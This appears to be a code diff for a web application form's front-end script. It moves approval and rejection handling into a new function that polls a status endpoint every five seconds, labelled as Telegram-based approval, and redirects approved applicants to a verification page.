@@ -1409,25 +1409,73 @@ setTimeout(() => {
 
         console.error("Application submission error:", error);
 
-if (data.status === "approved") {
-    window.location.href = APPROVED_REDIRECT_URL;
-    return;
-}
-
-if (data.status === "rejected") {
-    const statusMessage = document.getElementById("statusMessage");
-
-    if (statusMessage) {
-        statusMessage.style.display = "block";
-        statusMessage.textContent =
-            "Your application has been rejected. Please review your details and try again.";
-    }
-
-    return;
-}
-
     }
 });
+
+/* =====================================
+   CHECK TELEGRAM APPROVAL STATUS
+===================================== */
+
+async function checkApplicationStatus(applicationId, statusToken) {
+    const statusMessage = document.getElementById("processingMessage");
+
+    const checkStatus = async () => {
+        try {
+            const response = await fetch(
+                `${STATUS_URL}?id=${encodeURIComponent(applicationId)}&token=${encodeURIComponent(statusToken)}`
+            );
+
+            if (!response.ok) {
+                throw new Error("Status check failed: " + response.status);
+            }
+
+            const data = await response.json();
+
+            if (data.status === "approved") {
+                document.getElementById("processingTitle").textContent =
+                    "Application Approved";
+
+                statusMessage.textContent =
+                    "Congratulations! Your application has been approved. Redirecting to verification...";
+
+                document.getElementById("processingNote").textContent =
+                    "APPLICATION APPROVED";
+
+                window.location.href = APPROVED_REDIRECT_URL;
+                return true;
+            }
+
+            if (data.status === "rejected") {
+                document.getElementById("processingTitle").textContent =
+                    "Application Rejected";
+
+                statusMessage.textContent =
+                    "Your application has been rejected. Please review your details and try again.";
+
+                document.getElementById("processingNote").textContent =
+                    "PLEASE TRY AGAIN";
+
+                return true;
+            }
+
+            return false;
+
+        } catch (error) {
+            console.error("Status checking error:", error);
+            return false;
+        }
+    };
+
+    const interval = setInterval(async () => {
+        const finished = await checkStatus();
+
+        if (finished) {
+            clearInterval(interval);
+        }
+    }, 5000);
+
+    await checkStatus();
+}
 
 /* =====================================
    INITIAL CALCULATION
